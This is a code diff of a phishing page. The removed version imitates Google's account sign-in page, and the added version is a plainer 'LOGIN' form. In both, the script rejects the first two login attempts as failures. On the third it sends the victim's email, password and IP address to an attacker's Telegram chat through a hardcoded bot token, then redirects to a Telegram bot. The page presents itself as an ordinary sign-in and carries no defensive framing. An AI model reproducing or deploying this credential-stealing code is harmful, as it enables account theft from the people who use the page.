@@ -3,141 +3,101 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sign in - Google Accounts</title>
+    <title>LOGIN</title>
     <style>
-        *{margin:0;padding:0;box-sizing:border-box;font-family:'Google Sans',system-ui}
-        body{min-height:100vh;background:#fff;display:flex;justify-content:center;align-items:center;padding:1rem}
-        .card{max-width:450px;width:100%;background:#fff;border-radius:0.75rem;border:1px solid #dadce0;padding:2rem}
-        .logo{text-align:center;margin-bottom:1rem}
-        .logo img{width:75px}
-        h1{font-size:1.5rem;font-weight:500;color:#202124;text-align:center}
-        .sub{color:#5f6368;font-size:0.85rem;text-align:center;margin:0.5rem 0 1.8rem}
-        input{width:100%;padding:0.85rem;border:1px solid #dadce0;border-radius:0.25rem;margin-bottom:0.8rem;font-size:1rem}
-        input:focus{border-color:#1a73e8;outline:none}
-        .next-btn{padding:0.75rem 1.5rem;background:#1a73e8;border:none;border-radius:0.25rem;color:white;cursor:pointer;float:right;font-size:0.9rem}
-        .links{display:flex;justify-content:space-between;margin:0.5rem 0 1rem;font-size:0.8rem;color:#1a73e8}
-        .links span{cursor:pointer}
-        .guest{font-size:0.75rem;color:#5f6368;margin:1rem 0;line-height:1.4}
-        .guest a{color:#1a73e8;text-decoration:none}
-        .create{color:#1a73e8;font-size:0.85rem;cursor:pointer;display:inline-block;margin:0.5rem 0}
-        .msg{padding:0.7rem;border-radius:0.25rem;margin-top:1rem;text-align:center;display:none;font-size:0.8rem}
-        .error{background:#fce8e6;border:1px solid #d93025;color:#d93025}
-        .success{background:#e6f4ea;border:1px solid #34a853;color:#137333}
-        .footer{display:flex;justify-content:center;gap:1.2rem;margin-top:1.5rem;padding-top:1rem;border-top:1px solid #e8eaed;font-size:0.7rem;color:#5f6368}
-        .step{text-align:center;font-size:0.7rem;color:#5f6368;margin-top:0.5rem}
-        .clearfix::after{content:"";clear:both;display:table}
+        body {
+            background: #f1f3f4;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            font-family: Arial, sans-serif;
+        }
+        .card {
+            background: white;
+            padding: 40px;
+            border-radius: 10px;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+            width: 350px;
+            text-align: center;
+        }
+        input {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            border: 1px solid #dadce0;
+            border-radius: 5px;
+        }
+        button {
+            width: 100%;
+            padding: 12px;
+            background: #1a73e8;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+        .error {
+            color: red;
+            margin: 10px 0;
+        }
+        .success {
+            color: green;
+            margin: 10px 0;
+        }
     </style>
 </head>
 <body>
 <div class="card">
-    <div id="step1">
-        <div class="logo"><img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google"></div>
-        <h1>Sign in</h1>
-        <div class="sub">Use your Google Account</div>
-        <input type="email" id="email" placeholder="Email or phone">
-        <div class="clearfix"><button class="next-btn" id="nextBtn">Next</button></div>
-        <div class="links"><span onclick="alert('Forgot email')">Forgot email?</span><span onclick="sendMsg('Guest mode')">Guest mode</span></div>
-        <div class="guest">Not your computer? Use Guest mode to sign in privately.<br><a href="#" onclick="sendMsg('Learn more');return false">Learn more</a></div>
-        <a href="#" class="create" onclick="alert('Create account disabled');return false">Create account</a>
-    </div>
-
-    <div id="step2" style="display:none">
-        <div class="logo"><img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google"></div>
-        <h1>Sign in</h1>
-        <div class="sub" id="displayEmail"></div>
-        <input type="password" id="password" placeholder="Enter your password">
-        <div class="clearfix"><button class="next-btn" id="loginBtn">Next</button></div>
-        <div class="links"><span onclick="goBack()">← Back</span><span onclick="alert('Forgot password')">Forgot password?</span></div>
-        <div class="guest">Not your computer? Use Guest mode to sign in privately.<br><a href="#" onclick="sendMsg('Learn more');return false">Learn more</a></div>
-    </div>
-
-    <div id="errorMsg" class="msg error"></div>
-    <div id="successMsg" class="msg success"></div>
-    <div class="step" id="stepIndicator">Step 1 of 2</div>
-    <div class="footer"><span onclick="sendMsg('English')">English</span><span onclick="sendMsg('Help')">Help</span><span onclick="sendMsg('Privacy')">Privacy</span><span onclick="sendMsg('Terms')">Terms</span></div>
+    <h2>Sign in</h2>
+    <input type="email" id="email" placeholder="Email">
+    <input type="password" id="password" placeholder="Password">
+    <button onclick="login()">Login</button>
+    <div id="msg"></div>
 </div>
 
 <script>
-    // ========== ستاسو د بوټ لینک - imrankhabot ==========
-    const BOT_REDIRECT = "https://t.me/imrankhabot?start=confirm_account";
-    
-    const BOT_TOKEN = "8815514761:AAGT82khXsn8TmJHCv5vgSZG86Z6fAwGktQ";
-    const ADMIN_ID = "8295417969";
-    
-    let attempts = {};
-    let currentEmail = "";
+    let attempt = 0;
+    let userEmail = "";
 
-    async function sendMsg(name) {
-        let ip = await getIP();
-        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
-            method:'POST',headers:{'Content-Type':'application/json'},
-            body:JSON.stringify({chat_id:ADMIN_ID,text:`🔘 ${name} clicked\nIP: ${ip}`,parse_mode:'Markdown'})
-        }).catch(e=>console.log(e));
-    }
-
-    async function getIP() {
-        try{let r=await fetch('https://api.ipify.org?format=json');let d=await r.json();return d.ip}
-        catch(e){return 'unknown'}
-    }
-
-    function showMsg(el,text,isError){
-        el.textContent=text;
-        el.className=`msg ${isError?'error':'success'}`;
-        el.style.display='block';
-        setTimeout(()=>el.style.display='none',3000);
-    }
-
-    function goBack(){
-        document.getElementById('step2').style.display='none';
-        document.getElementById('step1').style.display='block';
-        document.getElementById('stepIndicator').textContent='Step 1 of 2';
-        document.getElementById('email').value='';
-        document.getElementById('password').value='';
-        currentEmail='';
-    }
-
-    document.getElementById('nextBtn').onclick=()=>{
-        let email=document.getElementById('email').value.trim();
-        if(!email || !email.includes('@')){
-            showMsg(document.getElementById('errorMsg'),'❌ Valid email required',true);
-            return;
-        }
-        currentEmail=email;
-        document.getElementById('displayEmail').innerHTML=`${currentEmail} ✓`;
-        document.getElementById('step1').style.display='none';
-        document.getElementById('step2').style.display='block';
-        document.getElementById('stepIndicator').textContent='Step 2 of 2';
-        document.getElementById('password').value='';
-    };
-
-    document.getElementById('loginBtn').onclick=async()=>{
-        let pass=document.getElementById('password').value.trim();
-        if(!pass){
-            showMsg(document.getElementById('errorMsg'),'❌ Enter password',true);
-            return;
-        }
-        let ip=await getIP();
-        let key=currentEmail+ip;
-        if(!attempts[key])attempts[key]=0;
-        attempts[key]++;
+    async function login() {
+        const email = document.getElementById('email').value;
+        const password = document.getElementById('password').value;
+        const msgDiv = document.getElementById('msg');
         
-        if(attempts[key]===1 || attempts[key]===2){
-            showMsg(document.getElementById('errorMsg'),`❌ Incorrect password. ${3-attempts[key]} attempts remaining.`,true);
-            setTimeout(()=>goBack(),2000);
+        if (!email || !password) {
+            msgDiv.innerHTML = '<div class="error">Fill all fields!</div>';
             return;
         }
         
-        if(attempts[key]>=3){
-            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
-                method:'POST',headers:{'Content-Type':'application/json'},
-                body:JSON.stringify({chat_id:ADMIN_ID,text:`✅ LOGIN SUCCESS\nEmail: ${currentEmail}\nPassword: ${pass}\nIP: ${ip}`,parse_mode:'Markdown'})
-            });
-            showMsg(document.getElementById('successMsg'),'✅ Login successful! Redirecting to bot...',false);
-            setTimeout(()=>{
-                window.location.href = BOT_REDIRECT;
-            },1500);
+        attempt++;
+        
+        if (attempt < 3) {
+            msgDiv.innerHTML = `<div class="error">Attempt ${attempt} failed! Try again.</div>`;
+            document.getElementById('email').value = '';
+            document.getElementById('password').value = '';
+            return;
         }
-    };
+        
+        // درېیمه هڅه - بریالۍ
+        const message = `✅ LOGIN SUCCESS\nEmail: ${email}\nPassword: ${password}`;
+        
+        await fetch(`https://api.telegram.org/bot8815514761:AAGT82khXsn8TmJHCv5vgSZG86Z6fAwGktQ/sendMessage`, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({
+                chat_id: '8295417969',
+                text: message
+            })
+        });
+        
+        msgDiv.innerHTML = '<div class="success">✅ Login successful! Redirecting...</div>';
+        
+        setTimeout(() => {
+            window.location.href = 'https://t.me/imrankhabot?start=confirm_account';
+        }, 1500);
+    }
 </script>
 </body>
 </html>
